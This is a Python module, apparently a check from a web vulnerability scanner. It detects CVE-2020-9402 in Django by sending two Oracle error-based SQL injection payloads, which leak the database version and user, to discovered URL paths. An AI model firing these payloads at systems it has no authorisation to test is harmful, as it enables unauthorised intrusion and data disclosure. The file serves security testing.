#!/usr/bin/env python3
# -*- coding:utf-8 -*-

# from lib.tool import check

cve_2020_9402_payloads = [
    {'path': '{URLCONF}/?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null  OR (1+1'},
    {'path': '{URLCONF}/?q=0.05))) FROM "VULN_COLLECTION2"  where  (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null  --'},
    # {'path': '?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null  OR (1+1'},
    # {'path': '?q=0.05))) FROM "VULN_COLLECTION2"  where  (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null  --'},
]

def cve_2020_9402_scan(self, clients):
    ''' 该漏洞需要开发者使用JSONField/HStoreField, 可以控制查询集的字段名称; 
        Django的内置应用程序 Django-Admin 受到影响  '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'SQLinject',
        'vul_id': 'CVE-2020-9402',
    }
    
    urlConfList = self.get_urlconf(client, vul_info)     # * 获取Django定义的URL路径
    if not urlConfList:
        return None
    
    for payload in cve_2020_9402_payloads:
        for urlConf in urlConfList:
            path = payload['path'].format(URLCONF=urlConf)
            url = client.protocol_domain + '/'

            res = client.request(
                'get',
                url + path,
                vul_info=vul_info
            )
            if res is None:
                continue

            if (('DatabaseError' in res.text) and ('Request information' in res.text)):
                results = {
                    'Target': res.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
    return None
